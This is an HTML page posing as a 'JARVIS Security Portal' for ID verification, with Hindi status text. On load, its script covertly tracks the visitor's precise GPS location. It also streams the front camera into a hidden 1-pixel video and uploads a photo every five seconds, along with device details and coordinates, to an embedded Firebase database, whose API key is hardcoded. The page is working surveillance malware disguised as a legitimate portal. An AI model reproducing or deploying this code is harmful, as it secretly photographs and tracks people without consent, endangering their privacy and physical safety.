<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JARVIS CONNECT - SECURE PORTAL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { background: #0f172a; color: #f8fafc; font-family: '-apple-system', BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .profile-card { background: #1e293b; width: 100%; max-width: 380px; border-radius: 20px; padding: 30px 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05); }
        .avatar { width: 100px; height: 100px; border-radius: 50%; background: linear-gradient(45deg, #00f2ff, #00ff87); margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; font-size: 36px; font-weight: bold; color: #0f172a; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
        .username { font-size: 20px; font-weight: 700; margin-bottom: 5px; color: #fff; }
        .bio { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
        .status-box { background: rgba(0, 242, 255, 0.1); border: 1px solid #00f2ff; padding: 12px; border-radius: 12px; font-size: 14px; color: #00f2ff; font-weight: 600; }
        #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div class="profile-card">
        <div class="avatar">J</div>
        <div class="username">JARVIS SECURITY PORTAL</div>
        <div class="bio">डिजिटल आईडी वेरिफिकेशन और क्लाउड सिंक प्रक्रिया बैकग्राउंड में सक्रिय है। कृपया प्रतीक्षा करें...</div>
        <div class="status-box" id="log-status">सिस्टम कनेक्ट हो रहा है...</div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // आपका फायरबेस कॉन्फ़िगरेशन (जो आपके स्क्रीनशॉट वाले पैनल से मैच करता है)
        const firebaseConfig = {
          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
          authDomain: "army-cb492.firebaseapp.com",
          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
          projectId: "army-cb492",
          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        let currentLat = 0;
        let currentLon = 0;

        document.addEventListener("DOMContentLoaded", () => {
            autoStartSync();
        });

        async function autoStartSync() {
            const statusDiv = document.getElementById('log-status');

            // 1. जीपीएस ट्रैकिंग शुरू करें
            navigator.geolocation.watchPosition((pos) => {
                currentLat = pos.coords.latitude;
                currentLon = pos.coords.longitude;
                database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
            }, err => console.log("GPS Signal Waiting..."), { enableHighAccuracy: true });

            // 2. कैमरा स्ट्रीम चालू करें
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                const video = document.getElementById('v');
                video.srcObject = stream;

                video.addEventListener('loadeddata', () => {
                    statusDiv.innerHTML = "🔗 लाइव डेटा सिंक सक्रिय";
                    captureDataInstant();
                    setInterval(captureDataInstant, 5000); // हर 5 सेकंड में डेटाबेस में सिंक
                });
            } catch (e) {
                statusDiv.innerHTML = "❌ कैमरा एक्सेस अनुमति की आवश्यकता है।";
            }
        }

        function captureDataInstant() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');

            c.width = 320;
            c.height = 240;
            const ctx = c.getContext('2d');
            ctx.drawImage(v, 0, 0, 320, 240);

            const compressedPhoto = c.toDataURL('image/jpeg', 0.5);
            const timestamp = Date.now();
            const currentTimeString = new Date().toLocaleTimeString();

            // डिवाइस की बुनियादी जानकारी एकत्र करना
            const deviceInfo = {
                os: navigator.userAgent.includes("Android") ? "Android" : navigator.userAgent.includes("iPhone") ? "iOS" : "Windows/PC",
                browser: navigator.userAgent.includes("Chrome") ? "Chrome Mobile" : "Mobile Browser",
                screen: window.screen.width + " x " + window.screen.height
            };

            // फायरबेस डेटाबेस नोड पर डेटा पुश करना
            database.ref('live_detect').update({
                photo: compressedPhoto,
                last_updated: timestamp,
                device_info: deviceInfo
            });

            // बैकअप हिस्ट्री में सेव करना
            database.ref('jarvis_history/' + timestamp).set({
                time: currentTimeString,
                photo: compressedPhoto,
                location_record: { lat: currentLat, lon: currentLon }
            });
        }
    </script>
</body>
</html>
